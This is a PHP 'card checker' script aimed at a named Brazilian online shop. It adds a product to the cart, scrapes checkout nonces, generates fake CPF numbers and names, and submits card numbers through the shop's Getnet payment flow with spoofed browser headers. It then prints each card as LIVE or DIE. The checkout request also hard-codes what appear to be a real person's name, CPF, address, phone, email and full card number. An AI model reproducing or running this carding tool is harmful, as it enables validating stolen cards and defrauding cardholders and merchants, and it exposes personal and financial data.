<?php
error_reporting(0);

$get = $_GET['lista'];
$explode = explode("|", $get);
$cc = $explode[0];
$mes = $explode[1];
$ano = $explode[2];
$cvv = $explode[3];

function getStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}

function gerarCPF($mascara = true) {
    $n = [];
    for ($i = 0; $i < 9; $i++) {
        $n[$i] = rand(0, 9);
    }
    $soma = 0;
    for ($i = 0; $i < 9; $i++) {
        $soma += $n[$i] * (10 - $i);
    }
    $resto = $soma % 11;
    $d1 = ($resto < 2) ? 0 : 11 - $resto;
    $n[9] = $d1;

    $soma = 0;
    for ($i = 0; $i < 10; $i++) {
        $soma += $n[$i] * (11 - $i);
    }
    $resto = $soma % 11;
    $d2 = ($resto < 2) ? 0 : 11 - $resto;
    $n[10] = $d2;

    if ($mascara) {
        return vsprintf('%d%d%d.%d%d%d.%d%d%d-%d%d', $n);
    }
    return implode('', $n);
}

function formatarCPF($cpf) {
    $cpf = preg_replace('/\D/', '', $cpf);
    if (strlen($cpf) === 11) {
        return vsprintf('%s%s%s.%s%s%s.%s%s%s-%s%s', str_split($cpf));
    }
    return $cpf;
}

function gerarNome() {
    $nomes = [
        'Lucas', 'Mateus', 'Gabriel', 'Felipe', 'Rafael', 'Bruno', 'Thiago', 'Rodrigo', 
        'Leonardo', 'Guilherme', 'Gustavo', 'Caio', 'Eduardo', 'Henrique', 'Diego', 
        'Mariana', 'Juliana', 'Camila', 'Beatriz', 'Larissa', 'Fernanda', 'Amanda', 
        'Leticia', 'Carolina', 'Jessica', 'Bruna', 'Renata', 'Patricia', 'Vanessa',
        'Daniel', 'Arthur', 'Bernardo', 'Enzo', 'Pedro', 'Vinicius', 'Vitor', 'Andre'
    ];
    return $nomes[array_rand($nomes)];
}

function gerarSobrenome() {
    $sobrenomes = [
        'Silva', 'Santos', 'Oliveira', 'Souza', 'Rodrigues', 'Ferreira', 'Alves', 
        'Pereira', 'Lima', 'Gomes', 'Costa', 'Ribeiro', 'Martins', 'Carvalho', 
        'Almeida', 'Lopes', 'Soares', 'Fernandes', 'Vieira', 'Barbosa', 'Rocha', 
        'Dias', 'Nascimento', 'Andrade', 'Moreira', 'Nunes', 'Marques', 'Machado', 
        'Mendes', 'Freitas', 'Cardoso', 'Ramos', 'Goncalves', 'Santana', 'Teixeira'
    ];
    if (rand(0, 1) === 1) {
        $s1 = $sobrenomes[array_rand($sobrenomes)];
        $s2 = $sobrenomes[array_rand($sobrenomes)];
        while ($s2 === $s1) {
            $s2 = $sobrenomes[array_rand($sobrenomes)];
        }
        return $s1 . ' ' . $s2;
    }
    return $sobrenomes[array_rand($sobrenomes)];
}

if (strlen($ano) == 2) {
    $anoInt = intval($ano);

    if ($anoInt >= 25 && $anoInt <= 35) {
        $ano = '20' . $ano;
    }
}

$cpf = !empty($_GET['cpf']) ? formatarCPF($_GET['cpf']) : gerarCPF(true);
$nome = !empty($_GET['nome']) ? trim($_GET['nome']) : gerarNome();
$sobrenome = !empty($_GET['sobrenome']) ? trim($_GET['sobrenome']) : gerarSobrenome();
$nomeCompleto = $nome . ' ' . $sobrenome;
$email = "zormimaq".rand(10, 10000000000);

// Limpa eventuais arquivos de cookie órfãos acumulados anteriormente
$staleCookies = glob(__DIR__ . DIRECTORY_SEPARATOR . 'zormimaq*.txt');
if (!empty($staleCookies)) {
    foreach ($staleCookies as $stale) {
        if (is_file($stale)) {
            @unlink($stale);
        }
    }
}

if (file_exists("guaito.txt")) {
  unlink("guaito.txt");
}


$bin = substr($cc, 0, 6);
$informacoes = '';
$INFO = '';

$binFile = __DIR__ . '/bins_resultados.txt';
if (file_exists($binFile) && is_readable($binFile)) {
    $handle = fopen($binFile, 'r');
    if ($handle) {
        while (($line = fgets($handle)) !== false) {
            $line = trim($line);
            if ($line !== '' && strpos($line, $bin) === 0) {
                $info = trim(substr($line, strlen($bin)));
                $INFO = $info;
                $informacoes = strtolower($INFO);
                break;
            }
        }
        fclose($handle);
    }
}

switch($ano){
case 2030: $ano = "30"; break;
case 2031: $ano = "31"; break;
case 2025: $ano = "25"; break;
case 2026: $ano = "26"; break;
case 2027: $ano = "27"; break;
case 2028: $ano = "28"; break;
case 2029: $ano = "29"; break;
case 2032: $ano = "32"; break;
case 2033: $ano = "33"; break;
case 2034: $ano = "34"; break;
case 2035: $ano = "35"; break;
case 2036: $ano = "36"; break;
case 2037: $ano = "37"; break;
case 2038: $ano = "38"; break;
case 2039: $ano = "39"; break;
case 2040: $ano = "40"; break;
}

function detectarBandeira($numero) {
    $numero = preg_replace('/\D/', '', $numero);
    $primeiro = substr($numero, 0, 1);
    $doisPrimeiros = substr($numero, 0, 2);
    if($primeiro == '4') return 'visa';
    if($doisPrimeiros >= '51' && $doisPrimeiros <= '55') return 'mastercard';
    if($doisPrimeiros == '34' || $doisPrimeiros == '37') return 'amex';
    if($doisPrimeiros >= '60' && $doisPrimeiros <= '65') return 'discover';
    if($doisPrimeiros == '30' || $doisPrimeiros == '36' || $doisPrimeiros == '38') return 'diners';
    if($doisPrimeiros == '35') return 'jcb';
    if($doisPrimeiros == '50' || ($doisPrimeiros >= '56' && $doisPrimeiros <= '58')) return 'mastercard';
    return 'visa';
}

$bandeira = strtolower(detectarBandeira($cc));

$inicio_transacao = microtime(true);



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://bonsaimorrovelho.com.br/produto/telinha-15x15cm/"); //URL
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'./guaito.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'./guaito.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Origin: https://bonsaimorrovelho.com.br',
    'Referer: https://bonsaimorrovelho.com.br/produto/telinha-15x15cm/',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36'
));

curl_setopt($ch, CURLOPT_POST, true);

curl_setopt($ch, CURLOPT_POSTFIELDS, array(
    'quantity' => '1',
    'add-to-cart' => '81210'
));

curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$carrinho = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://bonsaimorrovelho.com.br/checkout/"); //URL
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'./guaito.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'./guaito.txt');
$C2 = curl_exec($ch);
$nonce = getStr($C2, 'name="woocommerce-process-checkout-nonce" value="','"');
$nonce2 = getStr($C2, 'name="nonce_lkn_cielo_credit" value="','"');


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://bonsaimorrovelho.com.br/?wc-ajax=checkout"); //URL
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'./guaito.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'./guaito.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'accept: application/json, text/javascript, */*; q=0.01',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'origin: https://bonsaimorrovelho.com.br/checkout/',
    'referer: https://bonsaimorrovelho.com.br/checkout/',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36',
    'x-requested-with: XMLHttpRequest')); //Headers
    curl_setopt($ch, CURLOPT_POSTFIELDS, "wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_utm_source_platform=%28none%29&wc_order_attribution_utm_creative_format=%28none%29&wc_order_attribution_utm_marketing_tactic=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Fbonsaimorrovelho.com.br%2F&wc_order_attribution_session_start_time=2026-11-17+01%3A41%3A50&wc_order_attribution_session_pages=8&wc_order_attribution_session_count=2&wc_order_attribution_user_agent=Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F157.0.0.0+Safari%2F537.36&billing_first_name=BENEDITA&billing_last_name=PAVANI&billing_persontype=1&billing_cpf=041.028.160-38&billing_company=&billing_cnpj=&billing_country=BR&billing_postcode=91796-119&billing_address_1=Avenida+Jo%C3%A3o+Ant%C3%B4nio+Silveira&billing_number=4951&billing_address_2=casa&billing_neighborhood=restinga&billing_city=Porto+Alegre&billing_state=RS&billing_phone=%2851%29+99868-3442&billing_email=gussstaasasasas02%40gmail.com&account_password=&order_comments=&shipping_method%5B0%5D=free_shipping%3A8&payment_method=loja5_woo_getnet_api&getnet_api%5Bbandeira%5D=visa&getnet_api%5Bnumero%5D=4641270041020187&getnet_api%5Btitular%5D=BENEDITA+PAVANI&getnet_api%5Bfiscal%5D=04102816038&getnet_api%5Bvalidade_mes%5D=12&getnet_api%5Bvalidade_ano%5D=2033&getnet_api%5Bcvv%5D=$cvv&getnet_api%5Bparcela%5D=MXxGVUxMfDE5LjgwfGRtbHpZUT09fE1Ua3VPREE9fDRiNmU3Yjg0ZDU4NGVjNGY4MjE0ZGRiNDExN2ZmYTg3&getnet_api_debito%5Bbandeira%5D=&getnet_api_debito%5Bnumero%5D=&getnet_api_debito%5Btitular%5D=&getnet_api_debito%5Bfiscal%5D=04102816038&getnet_api_debito%5Bcelular%5D=&getnet_api_debito%5Bvalidade_mes%5D=$mes&getnet_api_debito%5Bvalidade_ano%5D=$ano&getnet_api_debito%5Bcvv%5D=&getnet_api_debito%5Bparcela%5D=&woocommerce-process-checkout-nonce=$nonce&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review");
 $C4 = curl_exec($ch);

$retorno = '';
$jsonCheckout = json_decode($C4, true);

if (!empty($jsonCheckout['messages'])) {
    $retorno = trim(strip_tags($jsonCheckout['messages']));
} else {
    $retorno = trim(strip_tags(getStr($C4, '<li>', '</li>')));
}

$segundos = round(microtime(true) - $inicio_transacao, 1);

if(strpos($C4, 'redirect') !== false) {
    echo 'LIVE '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.' 0000 - Transation authorized. ['.$segundos.'s]</span><br>';

}elseif(strpos($C4, 'failure')){
    echo 'DIE '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.' ↪ '.$C4.' ['.$segundos.'s]</span><br>';

}else{
    echo 'Error '.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.' ↪ Contate o admin ['.$segundos.'s]</span><br>';

}

curl_close($ch);
if (file_exists("cookies.txt")) {
    unlink("cookies.txt");
}
?>